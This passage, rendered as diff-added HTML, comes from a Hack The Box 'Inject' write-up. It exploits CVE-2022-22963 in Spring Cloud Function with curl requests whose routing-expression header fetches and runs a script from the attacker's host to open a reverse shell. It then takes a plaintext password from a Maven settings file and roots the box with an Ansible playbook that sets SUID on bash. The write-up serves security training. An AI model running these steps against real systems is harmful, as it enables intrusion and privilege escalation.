+<span class="w">        </span><span class="nt">&lt;relativePath/&gt;</span><span class="w"> </span><span class="cm">&lt;!-- lookup parent from repository --&gt;</span>
+<span class="w">    </span><span class="nt">&lt;/parent&gt;</span>
+<span class="w">    </span><span class="nt">&lt;groupId&gt;</span>com.example<span class="nt">&lt;/groupId&gt;</span>
+<span class="w">    </span><span class="nt">&lt;artifactId&gt;</span>WebApp<span class="nt">&lt;/artifactId&gt;</span>
+<span class="w">    </span><span class="nt">&lt;version&gt;</span>0.0.1-SNAPSHOT<span class="nt">&lt;/version&gt;</span>
+<span class="w">    </span><span class="nt">&lt;name&gt;</span>WebApp<span class="nt">&lt;/name&gt;</span>
+<span class="w">    </span><span class="nt">&lt;description&gt;</span>Demo<span class="w"> </span>project<span class="w"> </span>for<span class="w"> </span>Spring<span class="w"> </span>Boot<span class="nt">&lt;/description&gt;</span>
+<span class="w">    </span><span class="nt">&lt;properties&gt;</span>
+<span class="w">        </span><span class="nt">&lt;java.version&gt;</span>11<span class="nt">&lt;/java.version&gt;</span>
+<span class="w">    </span><span class="nt">&lt;/properties&gt;</span>
+<span class="w">    </span><span class="nt">&lt;dependencies&gt;</span>
+<span class="w">        </span><span class="nt">&lt;dependency&gt;</span>
+<span class="w">            </span><span class="nt">&lt;groupId&gt;</span>com.sun.activation<span class="nt">&lt;/groupId&gt;</span>
+<span class="w">            </span><span class="nt">&lt;artifactId&gt;</span>javax.activation<span class="nt">&lt;/artifactId&gt;</span>
+<span class="w">            </span><span class="nt">&lt;version&gt;</span>1.2.0<span class="nt">&lt;/version&gt;</span>
+<span class="w">        </span><span class="nt">&lt;/dependency&gt;</span>
+
+<span class="w">        </span><span class="nt">&lt;dependency&gt;</span>
+<span class="w">            </span><span class="nt">&lt;groupId&gt;</span>org.springframework.boot<span class="nt">&lt;/groupId&gt;</span>
+<span class="w">            </span><span class="nt">&lt;artifactId&gt;</span>spring-boot-starter-thymeleaf<span class="nt">&lt;/artifactId&gt;</span>
+<span class="w">        </span><span class="nt">&lt;/dependency&gt;</span>
+<span class="w">        </span><span class="nt">&lt;dependency&gt;</span>
+<span class="w">            </span><span class="nt">&lt;groupId&gt;</span>org.springframework.boot<span class="nt">&lt;/groupId&gt;</span>
+<span class="w">            </span><span class="nt">&lt;artifactId&gt;</span>spring-boot-starter-web<span class="nt">&lt;/artifactId&gt;</span>
+<span class="w">        </span><span class="nt">&lt;/dependency&gt;</span>
+
+<span class="w">        </span><span class="nt">&lt;dependency&gt;</span>
+<span class="w">            </span><span class="nt">&lt;groupId&gt;</span>org.springframework.boot<span class="nt">&lt;/groupId&gt;</span>
+<span class="w">            </span><span class="nt">&lt;artifactId&gt;</span>spring-boot-devtools<span class="nt">&lt;/artifactId&gt;</span>
+<span class="w">            </span><span class="nt">&lt;scope&gt;</span>runtime<span class="nt">&lt;/scope&gt;</span>
+<span class="w">            </span><span class="nt">&lt;optional&gt;</span>true<span class="nt">&lt;/optional&gt;</span>
+<span class="w">        </span><span class="nt">&lt;/dependency&gt;</span>
+
+<span class="w">        </span><span class="nt">&lt;dependency&gt;</span>
+<span class="w">            </span><span class="nt">&lt;groupId&gt;</span>org.springframework.cloud<span class="nt">&lt;/groupId&gt;</span>
+<span class="w">            </span><span class="nt">&lt;artifactId&gt;</span>spring-cloud-function-web<span class="nt">&lt;/artifactId&gt;</span>
+<span class="w">            </span><span class="nt">&lt;version&gt;</span>3.2.2<span class="nt">&lt;/version&gt;</span>
+<span class="w">        </span><span class="nt">&lt;/dependency&gt;</span>
+<span class="w">        </span><span class="nt">&lt;dependency&gt;</span>
+<span class="w">            </span><span class="nt">&lt;groupId&gt;</span>org.springframework.boot<span class="nt">&lt;/groupId&gt;</span>
+<span class="w">            </span><span class="nt">&lt;artifactId&gt;</span>spring-boot-starter-test<span class="nt">&lt;/artifactId&gt;</span>
+<span class="w">            </span><span class="nt">&lt;scope&gt;</span>test<span class="nt">&lt;/scope&gt;</span>
+<span class="w">        </span><span class="nt">&lt;/dependency&gt;</span>
+<span class="w">        </span><span class="nt">&lt;dependency&gt;</span>
+<span class="w">            </span><span class="nt">&lt;groupId&gt;</span>org.webjars<span class="nt">&lt;/groupId&gt;</span>
+<span class="w">            </span><span class="nt">&lt;artifactId&gt;</span>bootstrap<span class="nt">&lt;/artifactId&gt;</span>
+<span class="w">            </span><span class="nt">&lt;version&gt;</span>5.1.3<span class="nt">&lt;/version&gt;</span>
+<span class="w">        </span><span class="nt">&lt;/dependency&gt;</span>
+<span class="w">        </span><span class="nt">&lt;dependency&gt;</span>
+<span class="w">            </span><span class="nt">&lt;groupId&gt;</span>org.webjars<span class="nt">&lt;/groupId&gt;</span>
+<span class="w">            </span><span class="nt">&lt;artifactId&gt;</span>webjars-locator-core<span class="nt">&lt;/artifactId&gt;</span>
+<span class="w">        </span><span class="nt">&lt;/dependency&gt;</span>
+
+<span class="w">    </span><span class="nt">&lt;/dependencies&gt;</span>
+<span class="w">    </span><span class="nt">&lt;build&gt;</span>
+<span class="w">        </span><span class="nt">&lt;plugins&gt;</span>
+<span class="w">            </span><span class="nt">&lt;plugin&gt;</span>
+<span class="w">                </span><span class="nt">&lt;groupId&gt;</span>org.springframework.boot<span class="nt">&lt;/groupId&gt;</span>
+<span class="w">                </span><span class="nt">&lt;artifactId&gt;</span>spring-boot-maven-plugin<span class="nt">&lt;/artifactId&gt;</span>
+<span class="w">                </span><span class="nt">&lt;version&gt;</span><span class="cp">${</span><span class="n">parent</span><span class="o">.</span><span class="n">version</span><span class="cp">}</span><span class="nt">&lt;/version&gt;</span>
+<span class="w">            </span><span class="nt">&lt;/plugin&gt;</span>
+<span class="w">        </span><span class="nt">&lt;/plugins&gt;</span>
+<span class="w">        </span><span class="nt">&lt;finalName&gt;</span>spring-webapp<span class="nt">&lt;/finalName&gt;</span>
+<span class="w">    </span><span class="nt">&lt;/build&gt;</span>
+
+<span class="nt">&lt;/project&gt;</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+By conducting some research on the internet, we have discovered a vulnerability associated with Spring Cloud. We can proceed to perform certain exploitation tests to see if we can successfully exploit it.<br/><br/>
+<img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Easy/Inject/img/10.png?raw=true"/><br/><br/>
+While searching for the CVE on GitHub, we found the following repository:<br/><br/>
+<a href="https://github.com/me2nuk/CVE-2022-22963">CVE-2022-22963</a><br/><br/>
+<img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Easy/Inject/img/11.png?raw=true"/><br/><br/>
+In this repository, we have found a section that contains a command allowing us to remotely execute commands by making an HTTP request using the POST method, leveraging a Spring Cloud function.<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@parrot</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">curl</span><span class="w"> </span><span class="o">-</span><span class="n">X</span><span class="w"> </span><span class="n">POST</span><span class="w">  </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.129.35.222</span><span class="err">:</span><span class="mi">8080</span><span class="o">/</span><span class="n">functionRouter</span><span class="w"> </span><span class="o">-</span><span class="n">H</span><span class="w"> </span><span class="s1">'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl 10.10.16.42/probando")'</span><span class="w"> </span><span class="c1">--data-raw 'data' -v</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+We are attempting to have the machine make a request to our web server using the "curl" command.<br/><br/>
+<img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Easy/Inject/img/12.png?raw=true"/><br/><br/>
+We observe that the victim machine is making a GET request to our Python-based HTTP server. This indicates that we have successfully achieved remote command execution. Now, the next step is to send a reverse shell. We will proceed to create a file that contains the one-liner bash command to initiate the reverse shell.<br/><br/>
+<img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Easy/Inject/img/13.png?raw=true"/><br/><br/>
+Now we will instruct the server to copy our <code>pwned.sh</code> file and save it in the <code>/tmp</code> directory. Subsequently, we will execute it to receive the shell.<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@parrot</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">curl</span><span class="w"> </span><span class="o">-</span><span class="n">X</span><span class="w"> </span><span class="n">POST</span><span class="w">  </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.129.35.222</span><span class="err">:</span><span class="mi">8080</span><span class="o">/</span><span class="n">functionRouter</span><span class="w"> </span><span class="o">-</span><span class="n">H</span><span class="w"> </span><span class="s1">'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl 10.10.16.42/pwned.sh -o /tmp/pwned.sh")'</span><span class="w"> </span><span class="c1">--data-raw 'data' -v</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+<img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Easy/Inject/img/14.png?raw=true"/><br/><br/>
+Now, finally, we will proceed to execute the file that we have stored at the path <code>/tmp/pwned.sh</code>.<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@parrot</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">curl</span><span class="w"> </span><span class="o">-</span><span class="n">X</span><span class="w"> </span><span class="n">POST</span><span class="w">  </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.129.35.222</span><span class="err">:</span><span class="mi">8080</span><span class="o">/</span><span class="n">functionRouter</span><span class="w"> </span><span class="o">-</span><span class="n">H</span><span class="w"> </span><span class="s1">'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /tmp/pwned.sh")'</span><span class="w"> </span><span class="c1">--data-raw 'data' -v</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+Before executing the file, we need to make sure we are listening on port 443 using the netcat tool.<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@parrot</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">nlvp</span><span class="w"> </span><span class="mi">443</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+<img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Easy/Inject/img/15.png?raw=true"/><br/><br/>
+<h3><br>Shell as Phil</br></h3><br>
+Upon inspecting the personal directory of the user "Frank," we did not find the user flag. However, we did notice a directory named ".m2." Upon entering this directory, we discovered the "settings.xml" file, which contains credentials.<br/><br/>
+<div class="codehilite"><pre><span></span><code>frank@inject<span class="w"> </span>&gt;<span class="w"> </span>cat<span class="w"> </span>/home/frank/.m2/settings.xml
+<span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="nt">&lt;settings</span> <span class="na">xmlns=</span><span class="s">"http://maven.apache.org/POM/4.0.0"</span> <span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span>
+        <span class="na">xsi:schemaLocation=</span><span class="s">"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"</span><span class="nt">&gt;</span>
+<span class="w">  </span><span class="nt">&lt;servers&gt;</span>
+<span class="w">    </span><span class="nt">&lt;server&gt;</span>
+<span class="w">      </span><span class="nt">&lt;id&gt;</span>Inject<span class="nt">&lt;/id&gt;</span>
+<span class="w">      </span><span class="nt">&lt;username&gt;</span>phil<span class="nt">&lt;/username&gt;</span>
+<span class="w">      </span><span class="nt">&lt;password&gt;</span>DocPhillovestoInject123<span class="nt">&lt;/password&gt;</span>
+<span class="w">      </span><span class="nt">&lt;privateKey&gt;</span><span class="cp">${</span><span class="n">user</span><span class="o">.</span><span class="n">home</span><span class="cp">}</span>/.ssh/id_dsa<span class="nt">&lt;/privateKey&gt;</span>
+<span class="w">      </span><span class="nt">&lt;filePermissions&gt;</span>660<span class="nt">&lt;/filePermissions&gt;</span>
+<span class="w">      </span><span class="nt">&lt;directoryPermissions&gt;</span>660<span class="nt">&lt;/directoryPermissions&gt;</span>
+<span class="w">      </span><span class="nt">&lt;configuration&gt;&lt;/configuration&gt;</span>
+<span class="w">    </span><span class="nt">&lt;/server&gt;</span>
+<span class="w">  </span><span class="nt">&lt;/servers&gt;</span>
+<span class="nt">&lt;/settings&gt;</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+We attempted to use these credentials to perform a migration to the user "Phil" and verified that they are correct.<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">frank</span><span class="nv">@inject</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">su</span><span class="w"> </span><span class="n">phil</span>
+<span class="nl">Password</span><span class="p">:</span><span class="w"> </span><span class="n">DocPhillovestoInject123</span>
+<span class="n">phil</span><span class="nv">@inject</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span>
+</code></pre><br style="line-height: 0.5;"/></div>
+<h3><br>Shell as Root</br></h3><br>
+To escalate our privileges, the first step is to check if we have sudoers privileges. However, we did not find any relevant configurations in that regard. Nonetheless, we noticed that as the user "Phil," we belong to the "staff" group and have the ability to modify the contents of the "/opt/automation/tasks" directory.<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">phil</span><span class="nv">@inject</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">id</span><span class="w"> </span>
+<span class="n">uid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">phil</span><span class="p">)</span><span class="w"> </span><span class="n">gid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">phil</span><span class="p">)</span><span class="w"> </span><span class="n">groups</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">phil</span><span class="p">),</span><span class="mi">50</span><span class="p">(</span><span class="n">staff</span><span class="p">)</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+<div class="codehilite"><pre><span></span><code><span class="n">phil</span><span class="err">@</span><span class="n">inject</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">find</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">-</span><span class="n">group</span><span class="w"> </span><span class="n">staff</span><span class="w"> </span><span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="nb nb-Type">null</span>
+<span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">automation</span><span class="o">/</span><span class="n">tasks</span>
+<span class="o">/</span><span class="n">root</span>
+<span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">local</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">python3</span><span class="o">.</span><span class="mi">8</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">python3</span><span class="o">.</span><span class="mi">8</span><span class="o">/</span><span class="n">dist</span><span class="o">-</span><span class="n">packages</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">python3</span><span class="o">.</span><span class="mi">8</span><span class="o">/</span><span class="n">dist</span><span class="o">-</span><span class="n">packages</span><span class="o">/</span><span class="n">ansible_parallel</span><span class="o">.</span><span class="n">py</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">python3</span><span class="o">.</span><span class="mi">8</span><span class="o">/</span><span class="n">dist</span><span class="o">-</span><span class="n">packages</span><span class="o">/</span><span class="n">ansible_parallel</span><span class="o">-</span><span class="mf">2021.1</span><span class="o">.</span><span class="mf">22.</span><span class="n">dist</span><span class="o">-</span><span class="n">info</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">python3</span><span class="o">.</span><span class="mi">8</span><span class="o">/</span><span class="n">dist</span><span class="o">-</span><span class="n">packages</span><span class="o">/</span><span class="n">ansible_parallel</span><span class="o">-</span><span class="mf">2021.1</span><span class="o">.</span><span class="mf">22.</span><span class="n">dist</span><span class="o">-</span><span class="n">info</span><span class="o">/</span><span class="n">LICENSE</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">python3</span><span class="o">.</span><span class="mi">8</span><span class="o">/</span><span class="n">dist</span><span class="o">-</span><span class="n">packages</span><span class="o">/</span><span class="n">ansible_parallel</span><span class="o">-</span><span class="mf">2021.1</span><span class="o">.</span><span class="mf">22.</span><span class="n">dist</span><span class="o">-</span><span class="n">info</span><span class="o">/</span><span class="n">RECORD</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">python3</span><span class="o">.</span><span class="mi">8</span><span class="o">/</span><span class="n">dist</span><span class="o">-</span><span class="n">packages</span><span class="o">/</span><span class="n">ansible_parallel</span><span class="o">-</span><span class="mf">2021.1</span><span class="o">.</span><span class="mf">22.</span><span class="n">dist</span><span class="o">-</span><span class="n">info</span><span class="o">/</span><span class="n">entry_points</span><span class="o">.</span><span class="n">txt</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">python3</span><span class="o">.</span><span class="mi">8</span><span class="o">/</span><span class="n">dist</span><span class="o">-</span><span class="n">packages</span><span class="o">/</span><span class="n">ansible_parallel</span><span class="o">-</span><span class="mf">2021.1</span><span class="o">.</span><span class="mf">22.</span><span class="n">dist</span><span class="o">-</span><span class="n">info</span><span class="o">/</span><span class="n">WHEEL</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">python3</span><span class="o">.</span><span class="mi">8</span><span class="o">/</span><span class="n">dist</span><span class="o">-</span><span class="n">packages</span><span class="o">/</span><span class="n">ansible_parallel</span><span class="o">-</span><span class="mf">2021.1</span><span class="o">.</span><span class="mf">22.</span><span class="n">dist</span><span class="o">-</span><span class="n">info</span><span class="o">/</span><span class="n">METADATA</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">python3</span><span class="o">.</span><span class="mi">8</span><span class="o">/</span><span class="n">dist</span><span class="o">-</span><span class="n">packages</span><span class="o">/</span><span class="n">ansible_parallel</span><span class="o">-</span><span class="mf">2021.1</span><span class="o">.</span><span class="mf">22.</span><span class="n">dist</span><span class="o">-</span><span class="n">info</span><span class="o">/</span><span class="n">top_level</span><span class="o">.</span><span class="n">txt</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">python3</span><span class="o">.</span><span class="mi">8</span><span class="o">/</span><span class="n">dist</span><span class="o">-</span><span class="n">packages</span><span class="o">/</span><span class="n">ansible_parallel</span><span class="o">-</span><span class="mf">2021.1</span><span class="o">.</span><span class="mf">22.</span><span class="n">dist</span><span class="o">-</span><span class="n">info</span><span class="o">/</span><span class="n">INSTALLER</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">python3</span><span class="o">.</span><span class="mi">8</span><span class="o">/</span><span class="n">dist</span><span class="o">-</span><span class="n">packages</span><span class="o">/</span><span class="n">__pycache__</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">python3</span><span class="o">.</span><span class="mi">8</span><span class="o">/</span><span class="n">dist</span><span class="o">-</span><span class="n">packages</span><span class="o">/</span><span class="n">__pycache__</span><span class="o">/</span><span class="n">ansible_parallel</span><span class="o">.</span><span class="n">cpython</span><span class="o">-</span><span class="mf">38.</span><span class="n">pyc</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">fonts</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">fonts</span><span class="o">/.</span><span class="n">uuid</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+Considering that the directory is named "automation" and it contains a task within its "tasks" subdirectory, we can attempt to verify if our assumption is correct and if there is a task that runs at regular intervals. To achieve this, we can use the tool called <a href="https://github.com/DominicBreuker/pspy">pspy</a>.<br/><br/>
+After running it for a while, we observed that the root user executes the following:<br/><br/>
+<img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Easy/Inject/img/16.png?raw=true"/><br/><br/>
+Upon reviewing the <code>/opt/automation/tasks/</code> directory, we found a file named <code>playbook_1.yml</code>. However, this file is owned by the root user, and we do not have write permissions on it. However, we noticed that the periodically executed task runs all files in that directory with the .yml extension. Therefore, we can attempt to exploit this circumstance to perform unauthorized actions.<br/><br/>
+After conducting an internet search, we found a page that demonstrates how to execute commands using these types of files. You can refer to the following link for more information: <a href="https://docs.ansible.com/ansible/latest/playbook_guide/playbooks_strategies.html">Link to the page</a><br/><br/>
+Basically, we must create a .yml file with the following content:<br/><br/>
+<div class="codehilite"><pre><span></span><code>---
+- name: test play
+  hosts: webservers
+  serial: 3
+  gather_facts: False
+
+  tasks:
+    - name: first task
+      command: hostname
+    - name: second task
+      command: hostname
+</code></pre><br style="line-height: 0.5;"/></div>
+
+With this, we can leverage the fact that root executes the tasks to run privileged commands. In this case, we will execute the command <code>chmod u+s /bin/bash</code> to assign the SUID privilege to <code>/bin/bash</code>.<br/><br/>
+<div class="codehilite"><pre><span></span><code>---
+- name: test play
+  hosts: localhost
+  serial: 3
+  gather_facts: False
+
+  tasks:
+    - name: first task
+      command: chmod u+s /bin/bash
+</code></pre><br style="line-height: 0.5;"/></div>
+
+Next, we will save this content in a file named <code>pwned.yml</code> in the <code>/opt/automation/tasks/</code> directory. After a few minutes, the <code>/bin/bash</code> file will acquire the SUID attribute.<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">phil</span><span class="nv">@inject</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
+<span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">1183448</span><span class="w"> </span><span class="n">Apr</span><span class="w"> </span><span class="mi">18</span><span class="w">  </span><span class="mi">2022</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+Now, all that's left is to execute the command <code>bash -p</code> to obtain a root shell.<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">phil</span><span class="nv">@inject</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">bash</span><span class="w"> </span><span class="o">-</span><span class="n">p</span>
+<span class="n">bash</span><span class="o">-</span><span class="mf">5.0</span><span class="err">#</span><span class="w"> </span><span class="n">whoami</span>
+<span class="n">root</span>
+<span class="n">bash</span><span class="o">-</span><span class="mf">5.0</span><span class="err">#</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">root</span><span class="p">.</span><span class="n">txt</span>
+<span class="n">b1e</span><span class="o">**************************</span><span class="mi">205</span>
+<span class="n">bash</span><span class="o">-</span><span class="mf">5.0</span><span class="err">#</span><span class="w"> </span>
+</code></pre><br style="line-height: 0.5;"/></div></br></br></br></br></br></br></br>
+            </div>
+        </div>
+    </section>
+
+    <footer>
+        <p>&copy; 2023 elswix.github.io</p>
+    </footer>
+</body>
+</html>
